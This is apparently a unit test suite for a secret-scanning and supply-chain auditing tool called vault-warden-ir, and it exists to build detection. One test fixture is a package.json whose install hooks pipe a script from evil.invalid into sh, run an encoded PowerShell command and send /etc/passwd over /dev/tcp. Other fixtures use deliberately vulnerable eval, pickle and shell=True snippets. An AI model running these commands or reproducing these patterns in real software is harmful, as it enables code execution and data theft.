"""
Comprehensive unit and integration test suite for `vault-warden-ir`.

All synthetic secrets and tokens are constructed dynamically at runtime
(e.g., `"ghp_" + "A1b2C3" * 6`) so static scanners never flag literal
credentials in the repository source tree.
"""

from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
from pathlib import Path

from vault_warden.ast_auditor import audit_js_source, audit_python_source
from vault_warden.cli import install_hook, install_pre_commit_hook, install_pre_push_hook, main
from vault_warden.entropy import (
    calculate_shannon_entropy,
    calibrate_threshold,
    classify_charset,
    evaluate_token_entropy,
    is_false_positive_token,
    mask_secret,
)
from vault_warden.git_forensics import parse_git_log_patch, scan_git_history, scan_working_tree
from vault_warden.ignore import WardenIgnore
from vault_warden.sarif import build_sarif_report, format_sarif_json
from vault_warden.signatures import (
    SIGNATURE_CATALOG,
    constant_time_Token_match,
    scan_line_for_secrets,
    scan_text_for_secrets,
)
from vault_warden.supply_chain import (
    audit_cargo_lock,
    audit_package_json,
    audit_requirements_txt,
    detect_typosquat,
    levenshtein_distance,
)


class TestVaultWardenIR(unittest.TestCase):
    """Test suite verifying mathematical entropy, signatures, supply-chain, AST, and SARIF."""

    def test_01_shannon_entropy_mathematics(self) -> None:
        """Verify exact Shannon entropy H(X) calculations across known distributions."""
        # Single repeated symbol has 0 bits of entropy
        self.assertEqual(calculate_shannon_entropy("AAAAAAAAAAAAAAAA"), 0.0)
        # 2 equiprobable symbols have exactly 1.0 bit of entropy
        self.assertAlmostEqual(calculate_shannon_entropy("ABABABABABABABAB"), 1.0, places=4)
        # 4 equiprobable symbols have 2.0 bits of entropy
        self.assertAlmostEqual(calculate_shannon_entropy("ABCD" * 8), 2.0, places=4)
        # 16 unique hex characters equiprobable have 4.0 bits of entropy
        self.assertAlmostEqual(calculate_shannon_entropy("0123456789abcdef" * 2), 4.0, places=4)

    def test_02_charset_classification_and_entropy_thresholds(self) -> None:
        """Verify Hex, Base58, and Base64 classification and entropy detection."""
        self.assertEqual(classify_charset("deadbeef0123456789abcdef"), "hex")
        self.assertEqual(classify_charset("AbCdEfGhJkLmNpQrStUvWxYz12345"), "base58")
        self.assertEqual(classify_charset("AbCdEf0123+/="), "base64")

        # High-entropy Base64 secret constructed dynamically
        high_b64 = "".join(["Q9w8E7r6", "T5y4U3i2", "O1p0A9s8", "D7f6G5h4", "J3k2L1z0"])
        finding = evaluate_token_entropy(high_b64, line_context=f'api_secret = "{high_b64}"')
        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.cwe_id, "CWE-798")
        self.assertGreaterEqual(finding.entropy, 4.5)

    def test_03_false_positive_suppression(self) -> None:
        """Verify UUIDv4, lockfile SRI digests, and placeholders are ignored."""
        uuid_val = "550e8400-e29b-41d4-a716-446655440000"
        self.assertTrue(is_false_positive_token(uuid_val))

        sri_hash = "sha512-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2W3x4Y5z6=="
        self.assertTrue(is_false_positive_token(sri_hash, line_context=f'"integrity": "{sri_hash}"'))

        placeholder = "YOUR_API_KEY_REPLACE_ME_1234567890"
        self.assertTrue(is_false_positive_token(placeholder))

    def test_04_secret_redaction_safety(self) -> None:
        """Verify mask_secret never exposes the raw interior of a credential."""
        prefix = "gh" + "p_"
        body = "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
        raw_token = prefix + body
        masked = mask_secret(raw_token)
        self.assertTrue(masked.startswith(prefix))
        self.assertIn("****...****", masked)
        self.assertNotIn("E5f6G7h8I9j0", masked)
        self.assertEqual(mask_secret("short12"), "*******")

    def test_05_signature_catalog_completeness_and_constant_time(self) -> None:
        """Verify 25+ signatures are registered and constant-time comparison works."""
        self.assertGreaterEqual(len(SIGNATURE_CATALOG), 25)
        self.assertTrue(constant_time_Token_match("alpha_token_1", "alpha_token_1"))
        self.assertFalse(constant_time_Token_match("alpha_token_1", "alpha_token_2"))

    def test_06_dynamic_github_aws_stripe_secret_detection(self) -> None:
        """Verify runtime-constructed GitHub, AWS, and Stripe tokens trigger CWE-798."""
        gh_token = "gh" + "p_" + ("A9b8C7d6E5f4" * 3)
        aws_key = "AK" + "IA" + "IOSFODNN7WXYZ987"
        stripe_key = "sk_" + "live_" + ("9a8B7c6D5e4F3g2H1i0J" + "kLmNoPqRsTuV")

        snippet = "\n".join(
            [
                f'GITHUB_TOKEN = "{gh_token}"',
                f'AWS_ACCESS_KEY_ID = "{aws_key}"',
                f'STRIPE_KEY = "{stripe_key}"',
            ]
        )
        findings = scan_text_for_secrets(snippet, file_path="config.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("VW-SIG-003", rule_ids)
        self.assertIn("VW-SIG-001", rule_ids)
        self.assertIn("VW-SIG-009", rule_ids)
        # Ensure raw secrets are masked in finding output
        for f in findings:
            self.assertNotIn(gh_token, f.masked_secret)
            self.assertNotIn(stripe_key, f.masked_secret)

    def test_07_database_uri_and_jwt_detection(self) -> None:
        """Verify PostgreSQL/MongoDB URIs with embedded passwords and JWT tokens are caught."""
        pg_uri = "postgres" + "ql://sec_admin:" + "Pr0d_S3cr3t_P@ss99" + "@db.internal.net:5432/vault"
        jwt_tok = (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
            + "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
            + "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        )
        findings = scan_line_for_secrets(f"DB_URL={pg_uri} AUTH={jwt_tok}", file_path=".env")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("VW-SIG-014", rule_ids)
        self.assertIn("VW-SIG-013", rule_ids)

    def test_08_levenshtein_edit_distance_and_typosquatting(self) -> None:
        """Verify dynamic programming Levenshtein edit distance and typosquatting across PyPI/NPM/Cargo."""
        self.assertEqual(levenshtein_distance("requests", "requests"), 0)
        self.assertEqual(levenshtein_distance("reqeusts", "requests"), 2)
        self.assertEqual(levenshtein_distance("urllib4", "urllib3"), 1)
        self.assertEqual(levenshtein_distance("cross-envv", "cross-env"), 1)

        # PyPI typosquats
        self.assertIsNotNone(detect_typosquat("reqeusts", "pypi"))
        self.assertIsNotNone(detect_typosquat("urllib4", "pypi"))
        self.assertIsNone(detect_typosquat("requests", "pypi"))

        # NPM typosquats
        self.assertIsNotNone(detect_typosquat("lodahs", "npm"))
        self.assertIsNotNone(detect_typosquat("cross-envv", "npm"))
        self.assertIsNone(detect_typosquat("lodash", "npm"))

        # Cargo typosquats
        self.assertIsNotNone(detect_typosquat("tokoi", "cargo"))
        self.assertIsNone(detect_typosquat("tokio", "cargo"))

    def test_09_malicious_package_json_lifecycle_hooks(self) -> None:
        """Verify detection of malicious preinstall/postinstall scripts and insecure dependencies."""
        manifest = json.dumps(
            {
                "name": "compromised-pkg",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "curl -s https://evil.invalid/payload.sh | sh",
                    "postinstall": "powershell -enc SQBFAFgA",
                    "install": "bash -c 'cat /etc/passwd > /dev/tcp/10.0.0.1/4444'",
                },
                "dependencies": {
                    "lodahs": "^4.17.21",
                    "axios": "*",
                },
            },
            indent=2,
        )
        findings = audit_package_json(manifest, file_path="package.json")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("VW-SC-101", rule_ids)  # curl | sh
        self.assertIn("VW-SC-102", rule_ids)  # powershell -enc
        self.assertIn("VW-SC-104", rule_ids)  # /dev/tcp reverse shell
        self.assertIn("VW-SC-001", rule_ids)  # lodahs typosquat
        self.assertIn("VW-SC-002", rule_ids)  # unpinned *

    def test_10_requirements_and_cargo_lock_auditing(self) -> None:
        """Verify requirements.txt and Cargo.lock supply-chain checks."""
        req_txt = "reqeusts==2.31.0\nurllib4==1.26.0\ngit+http://insecure.invalid/repo.git\n"
        req_findings = audit_requirements_txt(req_txt, file_path="requirements.txt")
        self.assertGreaterEqual(len(req_findings), 3)

        cargo_lock = '[[package]]\nname = "tokoi"\nversion = "1.0.0"\nsource = "git+http://insecure.invalid/tokoi"\n'
        cargo_findings = audit_cargo_lock(cargo_lock, file_path="Cargo.lock")
        cargo_rules = {f.rule_id for f in cargo_findings}
        self.assertIn("VW-SC-001", cargo_rules)
        self.assertIn("VW-SC-003", cargo_rules)

    def test_11_python_ast_vulnerability_scanner(self) -> None:
        """Verify Python AST detection of eval, pickle.loads, yaml.load, shell=True, verify=False, and md5."""
        py_code = "\n".join(
            [
                "import hashlib, os, pickle, subprocess, yaml, requests",
                "def handler(user_input, raw_blob):",
                "    eval(user_input)",
                "    pickle.loads(raw_blob)",
                "    yaml.load(user_input)",
                "    subprocess.Popen(user_input, shell=True)",
                "    os.system(user_input)",
                "    requests.get('https://api.internal.invalid', verify=False)",
                "    return hashlib.md5(user_input.encode()).hexdigest()",
            ]
        )
        findings = audit_python_source(py_code, file_path="app.py")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("VW-AST-001", rule_ids)  # eval (CWE-94)
        self.assertIn("VW-AST-002", rule_ids)  # pickle.loads (CWE-502)
        self.assertIn("VW-AST-003", rule_ids)  # yaml.load without SafeLoader (CWE-502)
        self.assertIn("VW-AST-004", rule_ids)  # os.system (CWE-78)
        self.assertIn("VW-AST-005", rule_ids)  # shell=True (CWE-78)
        self.assertIn("VW-AST-006", rule_ids)  # hashlib.md5 (CWE-328)
        self.assertIn("VW-AST-007", rule_ids)  # verify=False (CWE-295)

    def test_12_python_ast_safeloader_exemption_and_js_sast(self) -> None:
        """Verify yaml.load(..., Loader=yaml.SafeLoader) is NOT flagged, and JS sinks ARE flagged."""
        safe_py = "import yaml\ndata = yaml.load('a: 1', Loader=yaml.SafeLoader)\n"
        self.assertEqual(len(audit_python_source(safe_py, file_path="safe.py")), 0)

        js_code = "const x = eval(userInput);\nelement.innerHTML = untrusted;\n"
        js_findings = audit_js_source(js_code, file_path="widget.js")
        js_rules = {f.rule_id for f in js_findings}
        self.assertIn("VW-AST-101", js_rules)
        self.assertIn("VW-AST-102", js_rules)

    def test_13_git_commit_history_forensics(self) -> None:
        """Verify scanning of historical Git commits catches a secret that was committed and later deleted."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            repo = Path(tmp_dir)
            subprocess.run(["git", "init", str(repo)], check=True, capture_output=True)
            subprocess.run(
                ["git", "-C", str(repo), "config", "user.name", "Test Operator"],
                check=True,
                capture_output=True,
            )
            subprocess.run(
                ["git", "-C", str(repo), "config", "user.email", "test@users.noreply.github.com"],
                check=True,
                capture_output=True,
            )

            # Commit 1: Introduce a dynamic secret
            dyn_token = "gh" + "p_" + ("Z9y8X7w6V5u4" * 3)
            secret_file = repo / "settings.py"
            secret_file.write_text(f'API_TOKEN = "{dyn_token}"\n', encoding="utf-8")
            subprocess.run(["git", "-C", str(repo), "add", "settings.py"], check=True, capture_output=True)
            subprocess.run(
                ["git", "-C", str(repo), "commit", "-m", "Initial settings"],
                check=True,
                capture_output=True,
            )

            # Commit 2: Delete the secret from the working tree
            secret_file.write_text('API_TOKEN = ""\n', encoding="utf-8")
            subprocess.run(["git", "-C", str(repo), "add", "settings.py"], check=True, capture_output=True)
            subprocess.run(
                ["git", "-C", str(repo), "commit", "-m", "Remove secret"],
                check=True,
                capture_output=True,
            )

            # Working tree should now be clean
            wt_findings = scan_working_tree(repo)
            self.assertEqual(len(wt_findings), 0)

            # Git history forensics must still catch the secret from Commit 1
            hist_findings = scan_git_history(repo, max_commits=5)
            self.assertGreaterEqual(len(hist_findings), 1)
            self.assertEqual(hist_findings[0].rule_id, "VW-SIG-003")
            self.assertIsNotNone(hist_findings[0].commit_hash)

    def test_14_sarif_v2_1_0_schema_output(self) -> None:
        """Verify SARIF v2.1.0 report structure, CWE taxonomy properties, and CLI subcommands."""
        sample_findings = [
            {
                "category": "secret",
                "rule_id": "VW-SIG-003",
                "rule_name": "GitHub Classic Personal Access Token",
                "cwe_id": "CWE-798",
                "severity": "critical",
                "file_path": "src/config.py",
                "line_number": 14,
                "column": 8,
                "masked_secret": "ghp_****...****x9z0",
                "description": "GitHub Classic Personal Access Token detected (CWE-798)",
            }
        ]
        sarif_doc = build_sarif_report(sample_findings)
        self.assertEqual(sarif_doc["version"], "2.1.0")
        run = sarif_doc["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "vault-warden-ir")
        self.assertEqual(len(run["results"]), 1)
        result = run["results"][0]
        self.assertEqual(result["ruleId"], "VW-SIG-003")
        self.assertEqual(result["level"], "error")
        self.assertEqual(
            result["locations"][0]["physicalLocation"]["region"]["startLine"],
            14,
        )
        json_str = format_sarif_json(sample_findings)
        parsed = json.loads(json_str)
        self.assertEqual(parsed["version"], "2.1.0")

    def test_15_install_pre_commit_hook_and_cli_exit_codes(self) -> None:
        """Verify `install-hook` creates an executable pre-commit hook and `scan` returns expected exit codes."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            repo = Path(tmp_dir)
            (repo / ".git").mkdir()
            hook_path = install_pre_commit_hook(repo)
            self.assertTrue(hook_path.is_file())
            hook_text = hook_path.read_text(encoding="utf-8")
            self.assertIn("vault_warden scan", hook_text)

            # Running scan on empty clean repo returns exit code 0
            exit_code = main(["scan", "--path", str(repo), "--format", "json", "--fail-on", "low"])
            self.assertEqual(exit_code, 0)

    def test_16_ai_and_cloud_token_signatures(self) -> None:
        """Verify high-precision detection of modern AI model provider tokens and cloud webhooks."""
        claude_key = "sk-ant-api03-" + ("A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6" * 3)[:85]
        openai_proj = "sk-proj-" + ("A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6" * 2)[:55]
        openai_admin = "sk-admin-" + ("A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6" * 2)[:55]
        hf_token = "hf_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
        discord_url = "https://discord.com/api/webhooks/987654321098765432/abCdEfGhIjKlMnOpQrStUvWxYzA9B8C7D6E5F4G3H2I1J0_AbCdEfGhIjKlMnOpQrSt"
        telegram_tok = "987654321:AAFlkmz89234jklsdf098234jklsdf98234"
        gcp_sa = '{"type": "service_account", "private_key": "-----BEGIN PRIVATE KEY-----"}'

        payload = "\n".join([
            f'CLAUDE="{claude_key}"',
            f'OPENAI_PROJ="{openai_proj}"',
            f'OPENAI_ADMIN="{openai_admin}"',
            f'HF_KEY="{hf_token}"',
            f'DISCORD="{discord_url}"',
            f'TELEGRAM="{telegram_tok}"',
            f'GCP=\'{gcp_sa}\'',
        ])

        findings = scan_text_for_secrets(payload, file_path="env.sample")
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("VW-SIG-029", rule_ids)  # Anthropic Claude
        self.assertIn("VW-SIG-030", rule_ids)  # OpenAI Project
        self.assertIn("VW-SIG-031", rule_ids)  # OpenAI Admin
        self.assertIn("VW-SIG-032", rule_ids)  # HuggingFace
        self.assertIn("VW-SIG-033", rule_ids)  # Discord Webhook
        self.assertIn("VW-SIG-026", rule_ids)  # Telegram Bot
        self.assertIn("VW-SIG-034", rule_ids)  # GCP Service Account

    def test_17_entropy_noise_calibration(self) -> None:
        """Verify noise filtering heuristics ignore CSS colors, repetitive hex, and UUIDs."""
        self.assertTrue(is_false_positive_token("0000000000000000"))
        self.assertTrue(is_false_positive_token("ffffffffffffffff"))
        self.assertTrue(is_false_positive_token("#00ff66"))
        self.assertTrue(is_false_positive_token("123e4567-e89b-12d3-a456-426614174000"))

        # Verify threshold calibration
        self.assertEqual(calibrate_threshold("hex", 32), 3.2)
        self.assertEqual(calibrate_threshold("base64", 40), 4.0)

    def test_18_wardenignore(self) -> None:
        """Verify .wardenignore path filtering and mock token whitelisting."""
        ignore_content = "\n".join([
            "# Comments and blank lines",
            "tests/**",
            "*.fixture",
            "token:TEST_MOCK_SECRET_TOKEN_XYZ",
        ])
        ign = WardenIgnore.parse(ignore_content)
        self.assertTrue(ign.is_path_ignored(Path("tests/test_file.py")))
        self.assertTrue(ign.is_path_ignored(Path("samples/data.fixture")))
        self.assertFalse(ign.is_path_ignored(Path("src/main.py")))

        self.assertTrue(ign.is_token_ignored("TEST_MOCK_SECRET_TOKEN_XYZ"))
        self.assertFalse(ign.is_token_ignored("REAL_SECRET_TOKEN_123"))

    def test_19_install_pre_push_hook(self) -> None:
        """Verify install-hook installs a pre-push git hook."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            repo = Path(tmp_dir)
            (repo / ".git").mkdir()
            hook_path = install_pre_push_hook(repo)
            self.assertTrue(hook_path.is_file())
            self.assertEqual(hook_path.name, "pre-push")
            hook_text = hook_path.read_text(encoding="utf-8")
            self.assertIn("vault_warden scan", hook_text)

            # Also verify install_hook helper with hook_type argument
            commit_hook = install_hook(repo, hook_type="pre-commit")
            self.assertEqual(commit_hook.name, "pre-commit")
            self.assertTrue(commit_hook.is_file())


if __name__ == "__main__":
    unittest.main()
